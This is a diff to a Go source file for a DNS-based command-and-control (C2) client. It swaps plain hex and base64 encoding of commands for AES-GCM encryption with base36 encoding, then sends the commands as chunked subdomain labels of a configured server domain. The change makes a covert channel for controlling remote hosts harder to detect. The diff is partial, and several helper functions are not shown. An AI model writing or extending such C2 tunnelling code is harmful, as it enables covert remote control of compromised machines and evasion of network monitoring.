@@ -1,8 +1,6 @@
 package main
 
 import (
-	"encoding/base64"
-	"encoding/hex"
 	"fmt"
 	"net"
 	"strings"
@@ -12,54 +10,46 @@ import (
 // DNSClient handles DNS-based C2 communication
 type DNSClient struct {
 	config *Config
+	aesKey []byte
 }
 
 // NewDNSClient creates a new DNS C2 client
 func NewDNSClient(config *Config) *DNSClient {
+	// Generate AES key from encryption key in config
+	aesKey := generateAESKey(config.EncryptionKey)
+
 	return &DNSClient{
 		config: config,
+		aesKey: aesKey,
 	}
 }
 
-// encodeCommand encodes a command string for DNS transmission
-func (c *DNSClient) encodeCommand(command string) string {
-	var encoded string
-	switch c.config.Encoding {
-	case "hex":
-		encoded = hex.EncodeToString([]byte(command))
-	case "base64":
-		encoded = base64.URLEncoding.EncodeToString([]byte(command))
-	default:
-		// Simple character replacement for basic commands
-		encoded = strings.ReplaceAll(command, " ", "-")
+// encodeCommand encrypts and encodes a command string for DNS transmission
+func (c *DNSClient) encodeCommand(command string) (string, error) {
+	// Use AES-GCM encryption + base36 encoding
+	encoded, err := encryptAndEncode(command, c.aesKey)
+	if err != nil {
+		return "", fmt.Errorf("failed to encrypt and encode command: %v", err)
 	}
-
-	return encoded
+	return encoded, nil
 }
 
-// decodeResponse decodes a DNS response back to readable format
+// decodeResponse decodes and decrypts a DNS response back to readable format
 func (c *DNSClient) decodeResponse(encoded string) (string, error) {
-	// Try hex first (to match our encoding method)
-	if decoded, err := hex.DecodeString(encoded); err == nil {
-		return string(decoded), nil
+	// Use base36 decoding + AES-GCM decryption
+	decoded, err := decodeAndDecrypt(encoded, c.aesKey)
+	if err != nil {
+		return "", fmt.Errorf("failed to decode and decrypt response: %v", err)
 	}
-
-	// Try base64 as fallback
-	missing := len(encoded) % 4
-	if missing > 0 {
-		encoded += strings.Repeat("=", 4-missing)
-	}
-	if decoded, err := base64.URLEncoding.DecodeString(encoded); err == nil {
-		return string(decoded), nil
-	}
-
-	// If all decoding fails, return as-is with basic character replacement
-	return strings.ReplaceAll(encoded, "-", " "), nil
+	return decoded, nil
 }
 
 // sendDNSQuery sends a command via DNS query
 func (c *DNSClient) sendDNSQuery(command string) (string, error) {
-	encodedCmd := c.encodeCommand(command)
+	encodedCmd, err := c.encodeCommand(command)
+	if err != nil {
+		return "", fmt.Errorf("failed to encode command: %v", err)
+	}
 
 	// Limit command length
 	if len(encodedCmd) > c.config.MaxCommandLength {
@@ -67,16 +57,12 @@ func (c *DNSClient) sendDNSQuery(command string) (string, error) {
 	}
 
 	// Create DNS query with encoded command as subdomain
-	// Split into 62-character chunks (even boundary) to comply with DNS label limits
+	// Split into 62-character chunks to comply with DNS label limits
 	var labels []string
 	for len(encodedCmd) > 0 {
 		chunkSize := len(encodedCmd)
 		if chunkSize > 62 {
 			chunkSize = 62
-		}
-		// Ensure we split on even hex boundaries (each byte = 2 hex chars)
-		if chunkSize%2 != 0 {
-			chunkSize--
 		}
 		labels = append(labels, encodedCmd[:chunkSize])
 		encodedCmd = encodedCmd[chunkSize:]
@@ -85,7 +71,6 @@ func (c *DNSClient) sendDNSQuery(command string) (string, error) {
 	queryName := fmt.Sprintf("%s.%s", strings.Join(labels, "."), c.config.ServerDomain)
 
 	var result string
-	var err error
 
 	// Determine query type
 	var qtype uint16
